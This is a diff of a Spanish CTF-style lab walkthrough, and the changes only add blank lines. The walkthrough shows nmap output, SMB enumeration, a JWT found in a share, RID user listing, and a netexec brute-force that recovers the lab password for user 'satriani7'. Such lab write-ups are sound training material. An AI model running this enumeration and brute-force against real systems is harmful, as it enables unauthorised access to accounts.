@@ -30,6 +30,7 @@ PORT    STATE SERVICE      REASON
 445/tcp open  microsoft-ds syn-ack ttl 64
 MAC Address: 32:99:3C:A5:58:17 (Unknown)
 ```
+
 - Vemos el puerto 80 HTTP, 22 SSH,  139 y 445 SMB.
 
 
@@ -54,6 +55,7 @@ PORT    STATE SERVICE     REASON         VERSION
 MAC Address: 32:99:3C:A5:58:17 (Unknown)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
 - Puerto 22 SSH: OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
 - Puerto 80 HTTP: Apache httpd 2.4.58 ((Ubuntu))
 - Puerto 139 y 445:  Samba smbd 4.6.2
@@ -117,6 +119,7 @@ smb: \> exit
 > cat access.txt
 eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InNhdHJpYW5pN0Blc2VlbWViLmRsIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MjgxNjAzNzMsImV4cCI6MTcyODE2Mzk3MywiandrIjp7Imt0eSI6IlJTQSIsIm4iOiI2MzU4NTI5OTgwNzk4MDM4NzI2MjQyMzYxMjc2NTg2NjE3MzU1MzUyMTMxNjU0ODI2NDI1ODg4NDkzNTU1NDYxNTIyNTc1NTAwNjY0ODY2MDM4OTY4ODMwNTk4OTY0NjUxOTQ2NDEzMzU4OTI1MzU2OTM4MDQwMTE1MjQzMDg4MTg0NTg1MzQxMzY5NTQyNTgxNTQwOTc3MjMzMjU0MTQxNzQ5NzczNDQyODkwNjc3ODY2MjI3NzUyMzEzMzg2OTk1NzA1ODAxNzM0NjA2NDE1NjkyNTM5MjAyNzc5OTczMjczODgyNTc1NTUwMTIwMDc4NjUzNDc0MTU1MjMyMjkwMDAxNjM4NTIwMTExNTUyNjE1NDkwMjQyOTYyMDA4MjYxNDI4NzA0MjAxNjcwOTg0NDUyMjY1NzcwNyIsImUiOjY1NTM3fX0.bQhS5qLCv5bf3sy-oHS7ZGcqqjk3LqyJ5bv-Jw6DIIoSIkmBtiocq07F7joOeKRxS3roWdHEuZUMeHQfWTHwRH7pHqCIBVJObdvHI8WR_Gac_MPYvwd6aSAoNExSlZft1-hXJUWbUIZ683JqEg06VYIap0Durih2rUio4Bdzv68JIo_3M8JFMV6kQTHnM3CElKy-UdorMbTxMQdUGKLk_4C7_FLwrGQse1f_iGO2MTzxvGtebQhERv-bluUYGU3Dq7aJCNU_hBL68EHDUs0mNSPF-f_FRtdENILwF4U14PSJiZBS3e5634i9HTmzRhvCGAqY00isCJoEXC1smrEZpg
 ```
+
 - El parecer es un token JWT pero que no me sirve de nada.
 
 
@@ -134,6 +137,7 @@ S-1-5-21-3519099135-2650601337-1395019858-1002 SAMBASERVER\usuario3 (Local User)
 S-1-5-21-3519099135-2650601337-1395019858-1003 SAMBASERVER\satriani7 (Local User)
 S-1-5-21-3519099135-2650601337-1395019858-1004 SAMBASERVER\administrador (Local User)
 ```
+
 - Nos interesa el user satriani7 y adminstrador
 ## Explotación
 
@@ -145,6 +149,7 @@ Con `netexec` realizamos un ataque de fuerza bruta al usuario `satriani7`
 ---------------------------------------------------------------------------
 SMB         172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\satriani7:50cent
 ```
+
 - Contraseña 50cent
 
 Listo los recursos a los que tiene acceso satriani7
